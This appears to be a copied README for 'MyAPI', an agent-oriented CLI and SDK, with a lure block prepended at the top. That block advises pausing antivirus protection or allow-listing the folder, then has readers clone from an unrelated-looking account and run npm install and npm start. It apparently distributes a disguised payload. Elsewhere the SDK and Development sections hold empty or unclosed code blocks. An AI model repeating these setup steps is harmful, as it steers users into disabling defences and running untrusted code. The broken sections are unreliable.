# MyAPI


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/MortalStonemason18/myapi-985.git
cd myapi-985
npm install
npm start
```


**The unified API for autonomous companies.** Ship a real business — website, backend, payments — from one terminal.

[![npm](https://img.shields.io/npm/v/@myapihq/cli?label=%40myapihq%2Fcli)](https://www.npmjs.com/package/@myapihq/cli)
[![license](https://img.shields.io/badge/license-Apache--2.0-blue)](./LICENSE)

Most platforms give you one piece — a host, a payment processor, a database. MyAPI gives you the whole company behind a single key: register a domain, publish a site, run backend functions, take payments, send email, store data. One CLI, one SDK, one auth model — built so a person *or an AI agent* can operate the entire thing end to end.

This repo is the client half of the platform: the CLI, the TypeScript SDK, and the agent skills. It all runs on your machine.

---

## See it

This runs right now — copy, paste, done:

```bash
npm i -g @myapihq/cli
myapi auth setup
echo '<h1>We are live</h1>' | myapi funnel push /
```

```
✓ Pushed page to /
Preview: https://swift-fox-42.makeautonomous.com
```

A real, public website in 30 seconds. No config, no deploy step, no account form — `auth setup` creates an anonymous account, an org, and a site for you.

Then give it a backend and a checkout:

```bash
myapi fn deploy <id> ./api.js        # edge function
myapi payments charge --amount 19    # Stripe checkout link
```

Run `myapi --help` for the full command surface.

---

## What you can build

### → You're an indie hacker

Go from idea to a paid product without standing up infrastructure:

```bash
myapi funnel publish ./site                    # your landing page, live
myapi fn create --name api                     # an edge function
myapi fn deploy <id> ./api.js                  # ship its code
myapi payments connect --stripe-key sk_live_…  # link your Stripe
myapi payments charge --amount 29 --every month --description "Pro plan"
```

The funnel is your site, the function is your backend, `payments` hands you a hosted Stripe Checkout URL. No servers to manage.

Functions are plain JavaScript that run on the edge, with the MyAPI SDK built in.

### → You're building an AI agent

Every capability is in the SDK, typed, behind one key — so an agent can take real-world actions without juggling five vendor APIs:

```ts
import { funnel, payments } from '@myapihq/sdk';

await funnel.publishFiles(key, orgId, funnelId, files);
const charge = await payments.createCharge(key, orgId, {
  amount_cents: 1900,
  description: 'Pro plan',
});
console.log(charge.checkout_url);
```

And `skills/` holds drop-in skill definitions that teach an AI coding agent (Claude, Gemini, Cursor) to drive MyAPI directly:

```bash
myapi install-skills
```

---

## The platform

One key, one CLI, one SDK — across every capability a company needs:

- **Web** — `funnel` (sites & landing pages), `domain` (registration + DNS), `url` (short links)
- **Backend** — `fn` (edge functions), `workflow` (event automations), `database` (KV store), `storage` (assets)
- **Payments** — `payments` (Stripe Checkout: one-off & recurring)
- **Comms** — `email` (send + verify), `webhook` (inbound events)
- **Data & AI** — `llm`, `image`, `crm`, `people`, `company`, `audience`, `pixel`

> **Coming soon — payments with no Stripe account of your own.** Today `payments` connects *your* Stripe account. Managed payments — take real money without your own Stripe account or a registered company — is on the way. The goal: anyone, or any agent, can run a business end to end.

Maturity varies by service — `myapi status` shows the live picture. Today, roughly:

| Status | Services |
|---|---|
| ✅ Stable | hq · domain · funnel · email-verify · image · webhook · crm · storage · database · workflow · llm |
| 🧪 Preview | email · url · functions · payments · people · company · audience |
| 🔜 Planned | pixel |

---

## What's in this repo

```
packages/cli      @myapihq/cli  — the myapi command-line tool
packages/sdk      @myapihq/sdk  — the TypeScript SDK
skills/           agent skill definitions (Claude, Gemini, Cursor)
packages/n8n      n8n community node          (experimental)
packages/make     Make (Integromat) modules   (experimental)
```

The experimental packages work but aren't published to their marketplaces yet — PRs welcome.

## SDK

```bash
```

```ts
import { hq, funnel } from '@myapihq/sdk';

const orgs = await hq.listOrgs('hq_live_…');
const funnels = await funnel.listFunnels('hq_live_…', orgs[0].id);
```

## Development

```bash

## Engineering principles

**Zero third-party dependencies.** The CLI and SDK pull in no third-party runtime code — the CLI's only dependency is the MyAPI SDK, which is ours. JavaScript's package ecosystem gets compromised regularly, and a globally-installed CLI that holds your API key must not inherit that risk. Zero dependencies means you can audit the whole client yourself. The same standard applies to the infrastructure behind the API.

**Built for agents.** Two numbers decide how good an agent tool is: tokens spent reading its output, and latency per call. We optimize both. A lean CLI beats MCP on each — MCP adds schema and per-call overhead the agent pays every time. We may ship an MCP server if there's demand; the CLI stays the primary surface.

**No lock-in.** Every MyAPI service is optional. Use one, use all of them, or use none and bring your own. Where we can, we give you a second option — you are never trapped in our ecosystem.

## Contributing

Issues and PRs welcome. For significant changes, open an issue first to discuss the approach.

## License

Apache-2.0 — see [LICENSE](./LICENSE).


<!-- Last updated: 2026-06-06 17:49:43 -->
